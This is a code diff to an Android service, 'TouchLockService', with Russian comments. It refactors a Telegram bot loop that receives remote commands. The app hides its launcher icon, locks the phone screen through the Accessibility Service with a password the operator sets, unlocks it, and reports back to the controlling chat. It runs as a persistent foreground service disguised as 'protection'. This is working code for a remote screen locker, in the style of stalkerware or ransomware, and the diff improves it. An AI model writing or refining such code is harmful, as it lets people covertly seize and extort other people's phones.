@@ -26,7 +26,7 @@ public class TouchLockService extends Service {
                 .build();
         
         createNotificationChannel();
-        startForeground(1, getMyNotification("Система защиты активна"));
+        startForeground(1, getMyNotification("Защита активна"));
         startPolling();
     }
 
@@ -34,60 +34,59 @@ public class TouchLockService extends Service {
         new Thread(() -> {
             while (true) {
                 try {
+                    // Используем offset, чтобы получать только НОВЫЕ сообщения
                     String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
-                    Response response = client.newCall(new Request.Builder().url(url).build()).execute();
+                    Request request = new Request.Builder().url(url).build();
+                    Response response = client.newCall(request).execute();
+                    
                     if (response.isSuccessful() && response.body() != null) {
                         JSONObject json = new JSONObject(response.body().string());
                         JSONArray results = json.getJSONArray("result");
+                        
                         for (int i = 0; i < results.length(); i++) {
-                            JSONObject update = resultToMessage(results.getJSONObject(i));
-                            if (update == null) continue;
+                            JSONObject updateObj = results.getJSONObject(i);
+                            
+                            // ВАЖНО: Обновляем ID, чтобы не получать это сообщение снова
+                            lastUpdateId = updateObj.getLong("update_id");
 
-                            String text = update.getString("text");
+                            if (!updateObj.has("message")) continue;
+                            JSONObject msg = updateObj.getJSONObject("message");
+                            adminChatId = msg.getJSONObject("chat").getString("id");
+                            
+                            String text = msg.optString("text", "");
                             String[] parts = text.split(" ");
                             String cmd = parts[0].toLowerCase();
 
                             new Handler(Looper.getMainLooper()).post(() -> {
-                                // 1. Команды управления ИКОНКОЙ (работают всегда)
-                                if (cmd.equals("/hide")) {
-                                    updateIconStatus(false);
-                                    sendTelegramMessage("👻 Иконка скрыта из меню");
-                                } 
-                                else if (cmd.equals("/show")) {
-                                    updateIconStatus(true);
-                                    sendTelegramMessage("👁 Иконка возвращена в меню");
-                                } 
-                                
-                                // 2. Команды БЛОКИРОВКИ (требуют Accessibility Service)
-                                else if (TouchLockAccessibilityService.instance != null) {
-                                    if (cmd.equals("/block")) {
-                                        String pass = (parts.length > 1) ? parts[1] : "0000";
-                                        TouchLockAccessibilityService.instance.lock(pass);
-                                        sendTelegramMessage("🔒 Экран заблокирован. Пароль: " + pass);
-                                    } else if (cmd.equals("/stop")) {
-                                        TouchLockAccessibilityService.instance.unlock();
-                                        sendTelegramMessage("🔓 Удаленная разблокировка выполнена");
-                                    }
-                                } else {
-                                    // Если команда пришла, а Accessibility не включен
-                                    if (cmd.equals("/block") || cmd.equals("/stop")) {
-                                        sendTelegramMessage("❌ Ошибка: На телефоне не включены 'Специальные возможности'!");
-                                    }
-                                }
+                                handleCommand(cmd, parts);
                             });
                         }
                     }
-                } catch (Exception ignored) {}
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
+                }
             }
         }).start();
     }
 
-    // Вспомогательный метод для парсинга сообщений и запоминания ID чата
-    private JSONObject resultToMessage(JSONObject result) throws JSONException {
-        if (!result.has("message")) return null;
-        JSONObject msg = result.getJSONObject("message");
-        adminChatId = msg.getJSONObject("chat").getString("id");
-        return msg;
+    private void handleCommand(String cmd, String[] parts) {
+        if (cmd.equals("/hide")) {
+            updateIconStatus(false);
+            sendTelegramMessage("👻 Иконка скрыта");
+        } else if (cmd.equals("/show")) {
+            updateIconStatus(true);
+            sendTelegramMessage("👁 Иконка возвращена");
+        } else if (TouchLockAccessibilityService.instance != null) {
+            if (cmd.equals("/block")) {
+                String pass = (parts.length > 1) ? parts[1] : "0000";
+                TouchLockAccessibilityService.instance.lock(pass);
+                sendTelegramMessage("🔒 Заблокировано. Пароль: " + pass);
+            } else if (cmd.equals("/stop")) {
+                TouchLockAccessibilityService.instance.unlock();
+                sendTelegramMessage("🔓 Разблокировано");
+            }
+        }
     }
 
     public void sendTelegramMessage(String message) {
@@ -96,17 +95,18 @@ public class TouchLockService extends Service {
             try {
                 String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + adminChatId + "&text=" + message;
                 client.newCall(new Request.Builder().url(url).build()).execute();
-            } catch (Exception e) { e.printStackTrace(); }
+            } catch (Exception ignored) {}
         }).start();
     }
 
     private void updateIconStatus(boolean show) {
-        // Мы используем MainActivity.class, так как именно эта активность является "входной точкой" с иконкой
         ComponentName componentName = new ComponentName(this, MainActivity.class);
-        getPackageManager().setComponentEnabledSetting(
-                componentName,
-                show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
+        int newState = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
+        
+        // Проверяем текущее состояние, чтобы не вызывать метод лишний раз
+        if (getPackageManager().getComponentEnabledSetting(componentName) != newState) {
+            getPackageManager().setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP);
+        }
     }
 
     private void createNotificationChannel() {
@@ -128,6 +128,4 @@ public class TouchLockService extends Service {
 
     @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
     @Override public IBinder onBind(Intent intent) { return null; }
-    @Override public void onDestroy() { instance = null; super.onDestroy(); }
 }
-
